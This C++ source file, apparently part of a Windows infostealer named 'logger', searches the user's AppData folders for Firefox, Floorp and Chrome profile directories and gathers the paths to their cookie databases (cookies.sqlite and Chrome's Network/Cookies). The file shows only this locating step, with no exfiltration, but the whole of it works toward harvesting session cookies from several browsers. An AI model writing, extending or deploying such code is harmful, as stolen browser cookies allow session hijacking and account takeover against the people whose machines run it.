/* API <windows.h>
Roaming (CSIDL_APPDATA)
Local (CSIDL_LOCAL_APPDATA)
LocalLow (CSIDL_LOCAL_APPDATA)
*/

#include <algorithm>
#include <vector>
#include <string>
#include <unordered_map>
#include <filesystem>
#include <windows.h>
#include <shlobj.h>
#include <iostream>

#include "logger.h"

void log_folders_in_path(const std::string& base_path, const std::vector<std::string>& target_folders, std::vector<std::string>& out_folders) {
    try {
        for (const auto& entry : std::filesystem::directory_iterator(base_path)) {
            if (entry.is_directory()) {
                std::string folder_name = entry.path().filename().string();
                if (std::find(target_folders.begin(), target_folders.end(), folder_name) != target_folders.end()) {
                    out_folders.push_back(entry.path().string());
                }
            }
        }
    } catch (const std::filesystem::filesystem_error& e) {
        std::cerr << "Filesystem Error: " << e.what() << std::endl;
    }
}

std::string firefox_based(const std::filesystem::path& p, const std::string& browser_name, bool main_dir) {
    std::filesystem::path firefox_path;
    if (main_dir) {
        firefox_path = p / "Profiles";
    } else {
        firefox_path = p / browser_name / "Profiles";
    }

    try {
        for (const auto& profile_entry : std::filesystem::directory_iterator(firefox_path)) {
            if (profile_entry.is_directory()) {
                std::filesystem::path cookie_file = profile_entry.path() / "cookies.sqlite";
                if (std::filesystem::exists(cookie_file)) {
                    return cookie_file.string();
                }
            }
        }
    } catch (const std::filesystem::filesystem_error& e) {
        std::cerr << "Filesystem Error: " << e.what() << std::endl;
    }
    return "";
}

std::vector<std::string> logger::log_appdata_folders() {
    char roaming_path[MAX_PATH];
    char local_path[MAX_PATH];

    std::vector<std::string> target_folders = {
        "Mozilla",
        "Google",
        "Vivaldi",
        "zen",
        "Floorp"
    };
    std::vector<std::string> found_folders;

    bool roaming_ok = SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, roaming_path));
    bool local_ok = SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local_path));

    if (!roaming_ok && !local_ok) {
        std::cerr << "Appdata directories not found!" << std::endl;
        return found_folders;
    }

    if (roaming_ok) {
        log_folders_in_path(roaming_path, target_folders, found_folders);
    }

    if (local_ok) {
        log_folders_in_path(local_path, target_folders, found_folders);
    }

    std::vector<std::string> cookie_paths;

    std::unordered_map<std::string, int> folder_switch = {
        {"Mozilla", 1},
        {"Floorp", 2},
        {"Google", 3}
    };

    for (const auto& folder_path : found_folders) {
        std::filesystem::path p(folder_path);
        std::string folder_name = p.filename().string();

        int folder_id = -1;
        auto it = folder_switch.find(folder_name);
        if (it != folder_switch.end()) {
            folder_id = it->second;
        }

        switch (folder_id) {
            case 1:
            {
                std::string result = firefox_based(p, "Firefox", false);
                if (!result.empty()) {
                    cookie_paths.push_back(result);
                }
                break;
            }
            case 2:
            {
                std::string result = firefox_based(p, "", true);
                if (!result.empty()) {
                    cookie_paths.push_back(result);
                }
                break;
            }
            case 3:
            {
                std::filesystem::path chrome_path = p / "Chrome" / "User Data" / "Default" / "Network";
                try {
                    std::filesystem::path cookie_file = chrome_path / "Cookies";
                    if (std::filesystem::exists(cookie_file)) {
                        cookie_paths.push_back(cookie_file.string());
                    } else {
                        std::cerr << "Chrome Cookies file not found at: " << cookie_file << std::endl;
                    }
                } catch (const std::filesystem::filesystem_error& e) {
                    std::cerr << "Filesystem Error: " << e.what() << std::endl;
                }
                break;
            }
            default:
                break;
        }
    }

    return cookie_paths;
}